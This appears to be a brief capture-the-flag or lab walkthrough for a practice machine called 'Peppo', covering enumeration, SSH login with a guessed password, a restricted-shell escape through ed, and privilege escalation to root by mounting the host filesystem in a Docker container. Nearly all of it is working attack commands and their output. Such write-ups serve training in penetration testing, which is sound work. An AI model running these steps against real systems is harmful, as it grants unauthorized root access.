# Peppo

### Enumeration

```
10000/tcp open   snet-sensor-mgmt?
|_auth-owners: eleanor
```

### Initial Access

```
$ ssh eleanor@192.168.189.60
eleanor:eleanor

-rbash: cat: command not found
eleanor@peppo:~$ ls bin
chmod  chown  ed  ls  mv  ping  sleep  touch
```

#### Escaping restricted shell

[https://gtfobins.github.io/gtfobins/ed/](https://gtfobins.github.io/gtfobins/ed/)

```
$ ed
!/bin/sh
```

```
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
$ python -c 'import pty; pty.spawn("/bin/bash")'
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

### PrivEsc

Eleanor is in docker group.

```
$ docker images
redmine             latest              0c8429c66e07        18 months ago       542MB
postgres            latest              adf2b126dda8        18 months ago       313MB
```

```
eleanor@peppo:/$ docker run -v /:/mnt --rm -it redmine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
```
